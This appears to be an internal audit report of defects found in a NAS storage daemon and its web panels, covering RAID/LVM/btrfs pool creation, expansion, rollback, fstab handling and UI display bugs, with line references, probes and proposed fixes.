Clean: confirm-code binding (probe confirm-binding.mts), cancel auth, gateway HMAC/assertion, socket 0600, executor argv/deadlines, lock table, splice gating, config-writer, CI/release pinning.

## AHR core

Coverage: ahr-core — 28 files in full, 8 in part, 11 NOT reached (routes/ahr-mutate.ts 1212-1763 scrub/repair routes; services ahr-layout, ahr-cache-state, ahr-io, partition-device, udev-settle; parsers btrfs-subvol-list, btrfs-usage, dmsetup, lvm-report).

- **AHR-CORE-H1** DEFECT repro  routes/ahr-mutate.ts:652, :673 + services/ahr-create.ts:513-535 (destroy.ts:333,340,350) — create with the DEFAULT mountpoint runs no collision gate and takes no mount lock; if another pool was moved to /mnt/anas-ahr/<name>, the job wipes disks, builds, mkfs, then fails at hasMount and its rollback UNMOUNTS whatever is mounted there and removes every fstab line at that path — the other pool's. Same rollback after any failure past the first wipefs. Probe p1-create-default-mp-collision.mts. Fix: gates + mount lock for the default path; rollback unmounts only a mount whose source is this pool's LV and removes only lines it wrote.
- **AHR-CORE-M2** DEFECT repro  routes/ahr-expand.ts:116-150 + services/ahr-expand-resume.ts:104-108 — expand/replace accept the pool's own hot spare (or cache disk) as an added disk; executor detaches the spare then grow fails (mdadm refusal mocked) -> band silently loses its spare; Replace with newDiskId=spare promotes spare to member (ruled OUT). Probe p4. Fix: refuse any addDisks/newDiskId in pool.disks. (ahr-panel L6 offers exactly these.)
- **AHR-CORE-M3** DEFECT repro  services/ahr-fstab.ts:110 — readAhrPoolLine takes the first line whose spec is the pool's LV; the Previous Versions `@snapshots` line has the same spec and comes first after a Change mountpoint -> snapshot-rollback remount / Remount verb mount the pool `-o ro,subvol=@snapshots`; boot cache rung mounts the wrong line. Probe p5. Identity audit #30 records the change-mountpoint cause; these readers are new doors.
- **AHR-CORE-M4** DEFECT repro  services/ahr-create.ts:374-375 + ahr-mdadm-conf.ts:113 — a foreign PROGRAM line in mdadm.conf makes every create fail AFTER wipe + array build (MdadmForeignProgramError not gated up front). Probe p3.
- **AHR-CORE-M5** DEFECT repro  services/ahr-topology.ts:540-557, 784-791, 1000-1001 — exit codes of vgs/lvs/pvs/ls by-id/lsblk/findmnt never checked: failed vgs => pool state `failed`, critical card "has FAILED — LVM layer missing"; failed by-id => kernel names into destroy's disk locks; failed lsblk => 0 partitions. Probe p2. (invented-state class; ahr.r1 covers only mdadm --detail)
- **AHR-CORE-M6** POSSIBLE  services/ahr-snapshots.ts:443-464 — rollback failing after the mv of @data leaves the pool unmounted, @data renamed away, real error replaced by the finally's mount error. Not run.
- **AHR-CORE-L7** POSSIBLE  ahr-boot-scan.ts:229-259 — GT-8 ladder trigger = an incremental assembly still waiting for a slow disk; runs --run --readwrite (degraded) and names a reshape it never read.
- **AHR-CORE-L8** DEFECT read  ahr-destroy.ts:216-217, 460-466 — unreadable lsblk at destroy => disks silently not zapped, job says destroyed.
- **AHR-CORE-L9** DEFECT read  ahr-identity.ts:98-99 -> ahr-destroy.ts:521-527 — unreadable mdadm.conf = "no pins" -> unpin skipped silently.
- **AHR-CORE-L10** DEFECT read ahr-expand-exec.ts:351-369 — failed lsblk label scan => resolveDiskNumber max=0 => joining disk gets ordinal d1 (duplicate labels).
- **AHR-CORE-L11** POSSIBLE  ahr-cache.ts:651-659, 717-727 — detach wipes any <pool>-cache<n>-labelled slice not a PV of another VG, without probing content.

Other doors: share-selfservice.ts:240-260 the @snapshots fstab line reuses the pool's LV spec (root of M3); does Mounts refuse targets under /mnt/anas-ahr/ ? (second way into H1).
Could not verify: mdadm's real answer for M2 (stunt node); boot ladder vs slow HBA; btrfs failure modes after mv.

## AHR (panels)

Coverage: ahr-panel (39-ahr.js, 39-ahr-composer.js) — both read in full.

- **AHR-PANEL-M1** DEFECT repro  39-ahr.js:775-776, 980-987 — spare/replacement rows counted as band members: healthy pool reads "raid5 x 5 (4 in sync)", band legend usable 16 TiB vs Capacity block 12 TiB. Daemon filters spares (ahr-topology.ts:1254, ahr-expand.ts:116). Fix: count non-spare rows in arraysHtml + poolBands.
- **AHR-PANEL-M2** DEFECT repro  39-ahr.js:833-840, 264-301, 401-417 — unmounted pool shown "mounted at /dev/<pool>/<pool>-vol, 0 B used, 0 B free"; grid Used/Free 0; change-mount prefills the LV path. Schema ahr.ts:473 says check `mounted`. Fix: gate on mounted===true, say "not mounted — usage unknown".
- **AHR-PANEL-M3** DEFECT repro  39-ahr.js:326-330, 1719-1727 — during the btrfs phase of a scrub the grid says healthy / Idle and Scrub is enabled (409 on click). Root in daemon ahr-topology.ts:963-1021 (state ladder does not read btrfs scrub status). scrub.r2 covered the Scrubs row only.
- **AHR-PANEL-L4** DEFECT repro  39-ahr-composer.js:762,784,796 — "Mount at" strips whitespace silently (typed "/srv/media pool" sends "/srv/mediapool"); confirm never names the mountpoint.
- **AHR-PANEL-L5** DEFECT repro  39-ahr-composer.js:828; 39-ahr.js:2084,2376,3134,3282 — pickers filter on status==='available' only and offer a hands-off (iscsi-served-here) disk; daemon refuses at every door (isComposableDisk). Wrong offer, not wrong act. Same in 38-pool-composer.js:1262.
- **AHR-PANEL-L6** DEFECT repro  39-ahr.js:3144-3152, 3269-3273 — expand wizard / Replace take every disk incl. spare and cache as a member (cache SSD painted with bands; daemon 400 "is not a member").
- **AHR-PANEL-L7** NOTICED       39-ahr.js:3057 + ahr-expand.ts:246 — expand confirm names no disk to be wiped.
- **AHR-PANEL-L8** NOTICED       39-ahr-composer.js:61-66 — nameValid allows 255, schema caps at ahrMaxPoolNameLength (29 for 1-9 disks).
- **AHR-PANEL-L9** POSSIBLE      39-ahr.js:1660 — held.detail unencoded into setTooltip (also 30-pools.js:601, 60-datasets.js ~950); needs a browser probe whether QuickTip renders HTML.

Other doors: ahr-topology.ts:873-887 mounted pool whose btrfs usage read fails reports 0 used/free (schema has no unknown). 10-api.js:915 confirm drops the 409 headline = already in EPICS.
Could not verify: QuickTip HTML; whether Expand is admitted mid btrfs scrub.
